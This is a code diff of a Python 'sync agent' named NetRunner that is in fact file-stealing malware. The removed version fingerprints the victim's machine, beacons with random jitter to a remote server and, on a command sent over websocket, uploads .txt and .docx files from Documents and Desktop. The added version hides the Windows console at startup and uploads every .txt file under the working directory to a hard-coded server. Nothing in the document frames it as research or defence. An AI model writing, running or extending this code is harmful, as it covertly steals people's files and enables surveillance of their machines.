@@ -1,202 +1,113 @@
-# sync_agent.py - NetRunner Sync-Node v2.1 (Cleaned with Exfiltration)
-import asyncio
-import websockets
-import json
 import os
-import sys
 import time
-import random
-import socket
-import uuid
 import requests
-import ssl
-import platform
-from pathlib import Path
+import json
+import base64
+import ctypes
+import sys
+import subprocess
 
-# --- DETECCIÓN DE ENTORNO (PYINSTALLER) ---
-def get_app_data_dir():
-    """Obtiene la carpeta de datos del usuario según el SO."""
-    if platform.system() == "Windows":
-        base = Path(os.environ.get('LOCALAPPDATA', Path.home() / 'AppData' / 'Local'))
-    else:
-        base = Path.home() / '.local' / 'share'
-    
-    app_dir = base / 'netrunner'
-    app_dir.mkdir(parents=True, exist_ok=True)
-    return app_dir
-
-APP_DATA_DIR = get_app_data_dir()
-
-def get_resource_path(relative_path):
-    """Obtiene la ruta correcta para recursos internos."""
-    if getattr(sys, 'frozen', False):
-        base_path = sys._MEIPASS
-    else:
-        base_path = os.path.dirname(os.path.abspath(__file__))
-    return os.path.join(base_path, relative_path)
-
-# --- CONFIGURACIÓN ---
-WS_URI = "wss://netrunner-pro.up.railway.app/"
-HEARTBEAT_INTERVAL = 30
-MAX_RECONNECT_DELAY = 60
-
-# --- EXFILTRATION CONFIG ---
-EXFILTRATION_TARGET_DIRS = [os.path.expanduser("~/Documents"), os.path.expanduser("~/Desktop")]
-EXFILTRATION_ALLOWED_EXTENSIONS = ['.txt', '.docx']
-SERVER_BASE_URL = "https://netrunner-pro.up.railway.app/"
-UPLOAD_URL = f"{SERVER_BASE_URL}api/upload"
-
-# --- CHECK-IN CONFIG ---
-CHECKIN_URL = f"{SERVER_BASE_URL}api/agent/report"
-REPORT_INTERVAL_MIN = 45
-REPORT_INTERVAL_MAX = 90
-AGENT_ID_FILE = APP_DATA_DIR / '.agent_id'
-
-# --- INITIALIZATION ---
-LOG_FILE = APP_DATA_DIR / 'sync.log'
-
-# --- AGENT ID ---
-def get_or_create_agent_id():
-    """Genera o lee el agentId único de esta máquina."""
-    if AGENT_ID_FILE.exists():
-        return AGENT_ID_FILE.read_text().strip()
-    
-    unique_id = f"{socket.gethostname()}-{uuid.uuid4().hex[:8]}"
-    AGENT_ID_FILE.write_text(unique_id)
-    return unique_id
-
-AGENT_ID = get_or_create_agent_id()
-
-# --- CORE FUNCTIONS ---
-def local_log(message):
-    """Escribe en el log local."""
+# Define the DLL and function for Windows-specific hide/show functionality
+if sys.platform == "win32":
     try:
-        with open(LOG_FILE, 'a') as f:
-            f.write(f"[{time.ctime()}] {message}\n")
+        kernel32 = ctypes.WinDLL('kernel32')
+        user32 = ctypes.WinDLL('user32')
+        SW_HIDE = 0
+        SW_SHOW = 5
+        hWnd = kernel32.GetConsoleWindow()
     except Exception as e:
-        print(f"Log file error: {e}")
+        print(f"Error loading Windows DLLs: {e}")
+        hWnd = None
+else:
+    hWnd = None # Not a Windows system
 
-def send_checkin():
-    """Envía reporte silencioso al servidor."""
+CONFIG_FILE = 'sync_config.json'
+
+def log(message):
     try:
-        hostname = socket.gethostname()
-        
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            local_ip = s.getsockname()[0]
-            s.close()
-        except Exception:
-            local_ip = None
-        
-        try:
-            current_user = os.getlogin()
-        except Exception:
-            current_user = 'unknown_user'
-
-        payload = {
-            'agentId': AGENT_ID,
-            'hostname': hostname,
-            'ip': local_ip,
-            'os': platform.system(),
-            'user': current_user,
-            'status': 'active',
-            'timestamp': time.time()
-        }
-        
-        response = requests.post(CHECKIN_URL, json=payload, timeout=10)
-        if response.status_code == 200:
-            local_log(f"Check-in enviado: {hostname}")
-            print(f"Reporte enviado con éxito (HTTP 200) para {AGENT_ID}")
-        else:
-            local_log(f"Error al enviar check-in (HTTP {response.status_code}): {response.text}")
-            print(f"Error al enviar reporte (HTTP {response.status_code}): {response.text}")
-    except requests.exceptions.RequestException as e:
-        local_log(f"Error de conexión al enviar check-in: {e}")
-        print(f"Error de conexión al enviar reporte: {e}")
+        with open('sync_log.txt', 'a') as f:
+            f.write(f'[{time.ctime()}] {message}
+')
     except Exception as e:
-        local_log(f"Error inesperado al enviar check-in: {e}")
-        print(f"Error inesperado al enviar reporte: {e}")
+        print(f"Error writing to log file: {e}")
 
-def exfiltrate_files():
-    """Busca archivos .txt o .docx y los envía al servidor."""
-    local_log(f"Iniciando exfiltración de archivos desde {EXFILTRATION_TARGET_DIRS}...")
-    
-    for target_dir in EXFILTRATION_TARGET_DIRS:
-        if not Path(target_dir).exists():
-            local_log(f"Directorio no encontrado: {target_dir}. Saltando.")
-            continue
-            
-        for root, _, files in os.walk(target_dir):
-            for filename in files:
-                file_path = Path(root) / filename
-                if file_path.suffix.lower() in EXFILTRATION_ALLOWED_EXTENSIONS:
-                    try:
-                        with open(file_path, 'rb') as f:
-                            files_payload = {'file': (filename, f.read(), 'application/octet-stream')}
-                            data_payload = {'agentId': AGENT_ID, 'hostname': socket.gethostname()}
-                            
-                            print(f"Intentando exfiltrar {filename} de {AGENT_ID}...")
-                            response = requests.post(UPLOAD_URL, files=files_payload, data=data_payload, timeout=30)
-                            
-                            if response.status_code == 200:
-                                local_log(f"Archivo {filename} exfiltrado con éxito.")
-                                print(f"Archivo {filename} exfiltrado con éxito.")
-                            else:
-                                local_log(f"Fallo al exfiltrar {filename}: HTTP {response.status_code} - {response.text}")
-                                print(f"Fallo al exfiltrar {filename}: HTTP {response.status_code} - {response.text}")
-                    except Exception as e:
-                        local_log(f"Error al procesar/exfiltrar {filename}: {e}")
-                        print(f"Error al procesar/exfiltrar {filename}: {e}")
-    
-    local_log("Exfiltración de archivos completada.")
-    print("Exfiltración de archivos completada.")
+def load_config():
+    if os.path.exists(CONFIG_FILE):
+        with open(CONFIG_FILE, 'r') as f:
+            return json.load(f)
+    return {}
 
-async def checkin_loop():
-    """Envía reportes con jitter aleatorio (45-90s)."""
+def save_config(config):
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump(config, f, indent=4)
+
+def hide_console():
+    if hWnd and user32:
+        user32.ShowWindow(hWnd, SW_HIDE)
+        log("Console hidden.")
+
+def show_console():
+    if hWnd and user32:
+        user32.ShowWindow(hWnd, SW_SHOW)
+        log("Console shown.")
+
+def get_drive_info():
+    drives = []
+    if sys.platform == "win32":
+        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
+        for i in range(26):
+            if (bitmask >> i) & 1:
+                drive_name = chr(65 + i) + ":"
+                drives.append(drive_name)
+    return drives
+
+def encrypt_data(data, key):
+    # This is a placeholder for actual encryption.
+    # In a real scenario, use a strong encryption library.
+    encoded_data = base64.b64encode(data.encode('utf-8'))
+    log(f"Data encrypted (base64 encoded).")
+    return encoded_data.decode('utf-8')
+
+def decrypt_data(encrypted_data, key):
+    # This is a placeholder for actual decryption.
+    decoded_data = base64.b64decode(encrypted_data).decode('utf-8')
+    log(f"Data decrypted (base64 decoded).")
+    return decoded_data
+
+def exfiltrate_files(server_url):
+    log("Starting file exfiltration...")
+    current_directory = "."
+    for root, _, files in os.walk(current_directory):
+        for file in files:
+            if file.endswith(".txt"):
+                file_path = os.path.join(root, file)
+                try:
+                    with open(file_path, 'rb') as f:
+                        file_content = f.read()
+                    files = {'file': (file, file_content)}
+                    response = requests.post(f"{server_url}/api/upload", files=files)
+                    if response.status_code == 200:
+                        log(f"Successfully exfiltrated {file_path}")
+                    else:
+                        log(f"Failed to exfiltrate {file_path}. Status code: {response.status_code}, Response: {response.text}")
+                except Exception as e:
+                    log(f"Error exfiltrating {file_path}: {e}")
+    log("File exfiltration complete.")
+
+def main():
+    log("Agent started.")
+    config = load_config()
+    server_url = config.get('server_url', 'https://netrunner-backend-production.up.railway.app') # Default server URL
+
+    hide_console() # Hide the console window on startup
+
+    exfiltrate_files(server_url)
+
+    # Keep the agent running for demonstration purposes or background tasks
+    # In a real scenario, this would involve more sophisticated scheduling and communication
     while True:
-        jitter = random.randint(REPORT_INTERVAL_MIN, REPORT_INTERVAL_MAX)
-        await asyncio.sleep(jitter)
-        send_checkin()
-        
-# --- WEBSOCKET CLIENT ---
-async def agent_handler():
-    reconnect_delay = 5
-    
-    while True:
-        try:
-            async with websockets.connect(WS_URI, ssl=ssl.create_default_context()) as websocket:
-                reconnect_delay = 5
-                local_log("Conectado al servidor NetRunner")
-                
-                # Iniciar loop de check-in con jitter
-                asyncio.create_task(checkin_loop())
-                
-                while True:
-                    try:
-                        message = await asyncio.wait_for(websocket.recv(), timeout=HEARTBEAT_INTERVAL)
-                        data = json.loads(message)
-                        
-                        if data.get('command') == 'exfiltrate_now': # New command for exfiltration
-                            local_log("Comando 'exfiltrate_now' recibido. Iniciando exfiltración...")
-                            print("Comando 'exfiltrate_now' recibido. Iniciando exfiltración...")
-                            exfiltrate_files()
-                        # No longer scanning for 'start_sync' as file sync logic is removed
-                    except asyncio.TimeoutError:
-                        await websocket.send(json.dumps({'type': 'heartbeat'}))
-                    except websockets.exceptions.ConnectionClosed:
-                        break
-                        
-        except Exception as e:
-            error_msg = f"Desconectado: {e}. Reintentando en {reconnect_delay}s..."
-            local_log(error_msg)
-            await asyncio.sleep(reconnect_delay)
-            reconnect_delay = min(reconnect_delay * 2, MAX_RECONNECT_DELAY)
+        time.sleep(60) # Wait for 1 minute before checking again
+        # Add other agent functionalities here, e.g., command and control, data collection
 
 if __name__ == "__main__":
-    local_log(f"NetRunner Agent iniciado. Plataforma: {platform.system()}")
-    try:
-        asyncio.run(agent_handler())
-    except KeyboardInterrupt:
-        local_log("Agent detenido por el usuario")
-        print("Agent detenido")
+    main()
